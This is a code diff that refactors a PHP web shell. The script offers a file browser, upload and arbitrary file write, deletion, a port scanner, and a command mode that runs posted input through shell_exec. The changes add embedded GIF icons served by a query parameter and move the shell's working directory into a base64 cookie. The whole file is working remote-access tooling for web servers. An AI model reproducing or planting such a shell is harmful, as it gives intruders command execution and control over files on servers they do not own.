@@ -25,111 +25,10 @@ define('DIR', (isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'
 define('MODE', (isset($_GET['mode']) ? $_GET['mode'] : (isset($_POST['mode']) ? $_POST['mode'] : 'browser')));
 //date_default_timezone_set('UTC');
 
-function p($data) { echo '<pre>'. print_r($data, true) .'</pre>'; }
-
-function getfperms($file)
+if (isset($_GET['genimg']) && !empty($_GET['genimg']))
 {
-  $perms = @fileperms($file);
-
-  if     (($perms & 0xC000) == 0xC000) $info = 's';
-  elseif (($perms & 0xA000) == 0xA000) $info = 'l';
-  elseif (($perms & 0x8000) == 0x8000) $info = '-';
-  elseif (($perms & 0x6000) == 0x6000) $info = 'b';
-  elseif (($perms & 0x4000) == 0x4000) $info = 'd';
-  elseif (($perms & 0x2000) == 0x2000) $info = 'c';
-  elseif (($perms & 0x1000) == 0x1000) $info = 'p';
-  else $info = 'u';
-
-  $info .= (($perms & 0x0100) ? 'r' : '-');
-  $info .= (($perms & 0x0080) ? 'w' : '-');
-  $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
-  $info .= (($perms & 0x0020) ? 'r' : '-');
-  $info .= (($perms & 0x0010) ? 'w' : '-');
-  $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
-  $info .= (($perms & 0x0004) ? 'r' : '-');
-  $info .= (($perms & 0x0002) ? 'w' : '-');
-  $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
-  return $info;
-}
-
-function build_params($p = array())
-{
-	if (!is_array($p)) $p = array($p);
-	
-	$tab = isset($_SERVER['QUERY_STRING']) ? array_unique(explode('&', $_SERVER['QUERY_STRING'])) : array();
-	$script_tags = array('mode', 'portscan', 'shell', 'e', 'v', 's', 'd', 'l', 'r');
-	
-	$ret = '';
-	foreach ($tab as $val)
-	{
-		$t = explode('=', $val);
-		if (!in_array($t[0], $p) and !in_array($t[0], $script_tags))
-			$ret .= '&' . $t[0] .'='. (isset($t[1]) ? $t[1] : '');
-	}
-
-	return $ret;
-}
-
-function print_tree_line($dir, $str, $space = '')
-{
-	return $space .'<a href="'. SCRIPT_NAME .'?mode=tree&dir='. $dir . build_params(array('mode', 'dir')) .'" class="plus">[+]</a>
-		<a href="'. SCRIPT_NAME .'?mode=browser&d='. $dir . build_params(array('mode', 'dir')) .'" class="linkdir" target="_top">'. $str ."</a><br>\n";
-}
-
-function list_dir($dir, $nr = 0)
-{
-	global $system_drives;
-
-	if (IS_WIN)
-		$dir = str_replace('\\', '/', $dir);
-	
-	$arbo = explode('/', $dir);
-	$space = $ret = $curdir = '';
-	for ($i = -1; $i != $nr; $i++) $space .= '&nbsp;&nbsp;&nbsp;&nbsp;';
-	
-	for ($j = 0; $j <= $nr; $j++) $curdir .= $arbo[$j] . '/';
-	
-	$top_dir = IS_WIN ? strtolower($arbo[0]) : '/';
-
-	//echo "scanning $curdir <br>";
-	if (IS_WIN && $nr == 0)
-	{
-		foreach ($system_drives as $letter)
-		{
-			if ($letter != $top_dir)
-				$ret .= print_tree_line($letter, strtoupper($letter));
-		}
-		$ret .= '-<br>';
-	}
-	if ($nr == 0) $ret .= print_tree_line($top_dir, strtoupper($top_dir));
-	
-	$list = @scandir($curdir);
-	if (!$list) return $space . 'Permission denied<br />';
-	foreach ($list as $v)
-	{
-		$e = $curdir . $v;
-		if (!in_array($v, array('.', '..')) and is_dir($e))
-		{
-			$ret .= print_tree_line($e, $v, $space);
-			if (isset($arbo[$nr + 1]) && $arbo[$nr + 1] == $v)
-				$ret .= list_dir($dir, ($nr+1));
-		}
-	}
-
-	return $ret;
-}
-
-function system_drives()
-{
-	$drives = array();
-	for ($ii=66;$ii<92;$ii++) 
-	{
-		$char = chr($ii);
-		if (is_dir($char.":/"))
-			$drives[] = strtolower($char) .':';
-	}
-	
-	return $drives;
+	display_image($_GET['genimg']);
+	die;
 }
 
 if (AUTHENT == true and !isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER']) !== USER_HASH || md5($_SERVER['PHP_AUTH_PW']) !== PASS_HASH)
@@ -145,7 +44,6 @@ $html_footer = '<body></html>';
 
 $system_drives = IS_WIN ? system_drives() : '';
 $lf = "\n";
-
 
 if (MODE == 'browser' && isset($_FILES['uploaded_file']))
 {
@@ -195,36 +93,15 @@ if (isset($_GET['d']) && isset($_GET['r']))
 		$deleted = '<br><span style="color: #048839;">File <b>'. $file .'</b> deleted.</span>';
 }
 
-$css = '<style>
-* {
-	font-family: monospace, sans-serif;
-	font-size: 11px;
-}
-.phpinfo {
-	font-family: Arial, sans-serif;
-	font-size: 12px;
-}
-table td {
-	padding: 0px 15px 0px 15px;
-}
-a {
-	text-decoration: none;
-}
-a.plus {
-	font-weight: bold;
-	color: #aaa;
-}
-a.linkdir {
-	text-decoration: none;
-	color: #55f;
-}
-a.menu {
-	font-weight: bold;
-	font-size: 11px;
-	color: #55f;
-</style>';
+$css = '<style>* {font-family: monospace, sans-serif;font-size: 11px;}
+.phpinfo {font-family: Arial, sans-serif;font-size: 12px;}
+table td {padding: 0px 15px 0px 15px;}
+a {text-decoration: none;}
+a.plus {font-weight: bold;color: #aaa;}
+a.linkdir {text-decoration: none;color: #55f;}
+a.menu {font-weight: bold;font-size: 11px;color: #55f;}</style>';
 
-
+// Save uploaded file
 if (isset($_POST['submit_file']))
 {
 	file_put_contents($_POST['filename'], $_POST['file_contents']);
@@ -253,14 +130,18 @@ if (MODE == 'shell')
 			$cmd_tab = explode(' ', $_POST['cmd']);
 			if (isset($cmd_tab[1]) AND !empty($cmd_tab[1]))
 			{
-				chdir(stripslashes($cmd_tab[1]));
-				$cwd = stripslashes($cmd_tab[1]);
+				if (!@chdir(stripslashes($cmd_tab[1])))
+					echo stripslashes($cmd_tab[1]) .": No such file or directory";
+				else
+					setcookie('cs', base64_encode(stripslashes($cmd_tab[1])));
 			}
 		}
 
 		else
 		{
-			chdir($cwd);
+			if (isset($_COOKIE['cs']))
+				@chdir(base64_decode($_COOKIE['cs']));
+
 			$cmd_output = shell_exec($_POST['cmd'] .' 2>&1');
 			$cmd_output = strtr($cmd_output, array(chr(255) => ' ', chr(244) => 'ô', chr(224) => 'à', chr(195) => 'é', chr(130) => 'é', chr(233) => 'é'));
 			echo $cmd_output;
@@ -288,7 +169,6 @@ if (MODE == 'shell')
 	echo $html_footer;
 }
 
-
 // Display file table
 if (MODE == 'browser')
 {
@@ -310,7 +190,7 @@ if (MODE == 'browser')
 	    </td>
 	    <td valign="top">';
 
-	if (isset($_GET['portscan']))
+	if (isset($_GET['portscan'])) // Mode: portscan
 	{
 		if (!isset($_POST['run_portscan']))
 		{
@@ -378,7 +258,8 @@ if (MODE == 'browser')
 			echo "</pre>";
 		}
 	}
-	else
+
+	else // Mode: file browser
 	{
 		if (IS_WIN) $cwd = str_replace('\\', '/', $cwd);
 		
@@ -430,11 +311,14 @@ if (MODE == 'browser')
 					 urlencode($val) . build_params('mode', 'd') .'">'. $val .'</a>';
 			}
 		
-			echo '<tr><td>'. $perms .'</td><td>'. $owner['name'] .'</td><td>'. $group['name'] .'</td><td>'.
-				 $val .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .
-				'</td><td>'. (!$is_dir ? '<a title="View" href="'. $view .'">[V]</a> <a title="Edit" href="'. $edit 
-				.'">[E]</a> <a title="Save" href="'. $down .'">[S]</a> <a title="Delete" href="'. $dele .'">[D]</a> ' : '&nbsp;'). 
-				'</td></tr>'. $lf;	
+			echo '<tr style="height: 16px;"><td>'. $perms .'</td><td>'. $owner['name'] .'</td><td>'. $group['name'] .'</td>';
+			echo '<td>'. $val .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
+			echo '<td>'. (!$is_dir ? 
+				'<a title="View" href="'. $view .'"><img src="'. SCRIPT_NAME .'?genimg=view" alt="View" /></a> '.
+				'<a title="Edit" href="'. $edit .'"><img src="'. SCRIPT_NAME .'?genimg=edit" alt="Edit" /></a> '.
+				'<a title="Save" href="'. $down .'"><img src="'. SCRIPT_NAME .'?genimg=save" alt="Download" /></a> '.
+				'<a title="Delete" href="'. $dele .'"><img src="'. SCRIPT_NAME .'?genimg=delete" alt="Delete" /></a> ' : '&nbsp;');
+			echo '</td></tr>'. $lf;	
 		}
 		echo '</table>';
 	}
@@ -457,6 +341,137 @@ if (MODE == 'browser')
 	clearstatcache();
 }
 
+function p($data) { echo '<pre>'. print_r($data, true) .'</pre>'; }
+
+// Get a file permissions
+function getfperms($file)
+{
+  $perms = @fileperms($file);
+
+  if     (($perms & 0xC000) == 0xC000) $info = 's';
+  elseif (($perms & 0xA000) == 0xA000) $info = 'l';
+  elseif (($perms & 0x8000) == 0x8000) $info = '-';
+  elseif (($perms & 0x6000) == 0x6000) $info = 'b';
+  elseif (($perms & 0x4000) == 0x4000) $info = 'd';
+  elseif (($perms & 0x2000) == 0x2000) $info = 'c';
+  elseif (($perms & 0x1000) == 0x1000) $info = 'p';
+  else $info = 'u';
+
+  $info .= (($perms & 0x0100) ? 'r' : '-');
+  $info .= (($perms & 0x0080) ? 'w' : '-');
+  $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
+  $info .= (($perms & 0x0020) ? 'r' : '-');
+  $info .= (($perms & 0x0010) ? 'w' : '-');
+  $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
+  $info .= (($perms & 0x0004) ? 'r' : '-');
+  $info .= (($perms & 0x0002) ? 'w' : '-');
+  $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
+  return $info;
+}
+
+// Query string parameters for hrefs
+function build_params($p = array())
+{
+	if (!is_array($p)) $p = array($p);
+	
+	$tab = isset($_SERVER['QUERY_STRING']) ? array_unique(explode('&', $_SERVER['QUERY_STRING'])) : array();
+	$script_tags = array('mode', 'portscan', 'shell', 'genimage', 'e', 'v', 's', 'd', 'l', 'r');
+	
+	$ret = '';
+	foreach ($tab as $val)
+	{
+		$t = explode('=', $val);
+		if (!in_array($t[0], $p) and !in_array($t[0], $script_tags))
+			$ret .= '&' . $t[0] .'='. (isset($t[1]) ? $t[1] : '');
+	}
+
+	return $ret;
+}
+
+// Prints a line in the tree
+function print_tree_line($dir, $str, $space = '')
+{
+	return $space .'<a href="'. SCRIPT_NAME .'?mode=tree&dir='. $dir . build_params(array('mode', 'dir')) .'" class="plus">[+]</a>
+		<a href="'. SCRIPT_NAME .'?mode=browser&d='. $dir . build_params(array('mode', 'dir')) .'" class="linkdir" target="_top">'. $str ."</a><br>\n";
+}
+
+// Lists files in a directory
+function list_dir($dir, $nr = 0)
+{
+	global $system_drives;
+
+	if (IS_WIN)
+		$dir = str_replace('\\', '/', $dir);
+	
+	$arbo = explode('/', $dir);
+	$space = $ret = $curdir = '';
+	for ($i = -1; $i != $nr; $i++) $space .= '&nbsp;&nbsp;&nbsp;&nbsp;';
+	
+	for ($j = 0; $j <= $nr; $j++) $curdir .= $arbo[$j] . '/';
+	
+	$top_dir = IS_WIN ? strtolower($arbo[0]) : '/';
+
+	//echo "scanning $curdir <br>";
+	if (IS_WIN && $nr == 0)
+	{
+		foreach ($system_drives as $letter)
+		{
+			if ($letter != $top_dir)
+				$ret .= print_tree_line($letter, strtoupper($letter));
+		}
+		$ret .= '-<br>';
+	}
+	if ($nr == 0) $ret .= print_tree_line($top_dir, strtoupper($top_dir));
+	
+	$list = @scandir($curdir);
+
+	if (!$list)
+		return $space . 'Permission denied<br />';
+	
+	foreach ($list as $v)
+	{
+		$e = $curdir . $v;
+		if (!in_array($v, array('.', '..')) and is_dir($e))
+		{
+			$ret .= print_tree_line($e, $v, $space);
+			if (isset($arbo[$nr + 1]) && $arbo[$nr + 1] == $v)
+				$ret .= list_dir($dir, ($nr+1));
+		}
+	}
+
+	return $ret;
+}
+
+// Lists system drives on Windows
+function system_drives()
+{
+	$drives = array();
+	for ($ii=66;$ii<92;$ii++) 
+	{
+		$char = chr($ii);
+		if (is_dir($char.":/"))
+			$drives[] = strtolower($char) .':';
+	}
+	
+	return $drives;
+}
+
+// Displays an image
+function display_image($img)
+{
+	switch ($img)
+	{
+		case 'view': $img = base64_decode('R0lGODlhEAAQAPQAAAAzZmZmZnx8fDhehDNmmUx/sm+IomaMs2aZzGaZ/3+y5Xms/3+y/4WFhZeXl6enp7i4uIK1/5nL/6XP/6rU/7zb/MfHx9vb28Hc+Mnj/urq6v7+/gAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAV24LZdkONAl6iu1pOOj7Wq17NlUrJs7sxfmYpIsqj5GhtJJJLQbZAzQVJCZUQ20pnDgqFkMpOKxeGDNDQYKkbTgPg0j4ZFo7EgyW9zINAOjA9vGhcXdBcBCgoEPj4DBQoSiosqGgAIj5GSI5WXmSIXm5iZnwAGIQA7'); break ;
+		case 'edit': $img = base64_decode('R0lGODlhEAAQAPQAADMzMwBVABFvEWZmZpkzM8wzM8xmM91mZv9mZiKIIjOZM02zTWbMZuWATf+ZZoiIiJmZmaqqqru7u/+/mczMzN3d3d7e3v/lzP///wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAVOICaOpAghSKliUBUdxTomTEQ9sUwvyiMNOgYvkRhYVjsFMXBUJZfN0jPBRAqV1ChpWnVeodZhduW4CLBdVeMyCYxlgInDkV4BAASDdhUCADs='); break ;
+		case 'save': $img = base64_decode('R0lGODlhEAAQAPQAADo6OkhISFlZWWhoaHp6eoeHh5aWlqqqqrS0tL/M2afT/7nc/8PDw9vb28jk/93u/+bm5un0//7+/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAV+oCSOZCkWg6IsTuss6lCIg2GSxkDbt5iLAkNkSCwaBMBCcRkpICWCQuJBrVITTlEANeh6vYWAlkAum8liSYDMaLjfDPR40AAA3u4BIQ0YCBgBAQyDgwIDACJ9AQgCAgiPjwGHIgh2B10HmZl9iJR9BAWhBQSHAE8ieKluEBIhADs='); break ;
+		case 'delete': $img = base64_decode('R0lGODlhEAAQAPQAAMwiANY2FuM9GuNBH9ZFJ9pXPPpYNuxLKf1hP/1mRfp5V+9vT9V+beJtVdaAb9+Kef6FZf6VdPOJctmXiv+qiO+mlf+yofm/s97CvP7BtN7e3v7k3uvr6/7+/v/n4ejNySH5BAAAAAAALAAAAAAQABAAAAWZYCeOZFl6FpQkkOWZXaZAEUVFkJKVWRItBACAsIgkdqLNArIoTDSaQoLC3Igqi+aH07FMAdmKaKE4iLvfxkGxEB0gAq6XAnBwBJCDaFBG0+0dawMiUgYSX4AXBgkFIg8HK39cHgoJBw8iHwQGEAASXBkQCAYEHyMTAQeLKwkGBwETJByoAqquArBcshgMQUMMGLomHBxQxCUhADs='); break ;
+		default: die('wrong image');
+	}
+	header('Content-Type: image/gif');
+	echo $img;
+}
+
+// Get nmap-like services array
 function get_services()
 {
 	/* /etc/nmap-services equivalent table, used for portscan */
